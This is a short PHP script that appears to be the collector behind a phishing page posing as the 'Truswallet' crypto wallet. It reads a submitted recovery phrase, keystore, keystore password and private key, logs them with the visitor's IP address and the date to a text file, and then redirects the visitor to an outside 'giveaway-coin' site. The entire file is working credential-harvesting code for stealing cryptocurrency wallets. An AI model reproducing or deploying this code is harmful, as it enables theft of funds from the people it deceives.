<?php
$file =  "=====================Truswallet================.txt";
$phrase = $_POST['phrase'];
$keystore = $_POST['keystore'];
$keystorepasswword = $_POST['keystorepasswword'];
$privatekey = $_POST['privatekey'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "=====================[Truswallet]========================");
fwrite($handle, "\n");
fwrite($handle, "phrase		        : ");
fwrite($handle, "$phrase");
fwrite($handle, "\n");
fwrite($handle, "keystore		: ");
fwrite($handle, "$keystore");
fwrite($handle, "\n");
fwrite($handle, "keystorepasswword	: ");
fwrite($handle, "$keystorepasswword");
fwrite($handle, "\n");
fwrite($handle, "privatekey		: ");
fwrite($handle, "$privatekey");
fwrite($handle, "\n");
fwrite($handle, "IP Address		: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Date Submitted		: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "=====================[Truswallet]========================");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"http://giveaway-coin.c1.biz/connectwallet/\";
// -->
</script>";
?>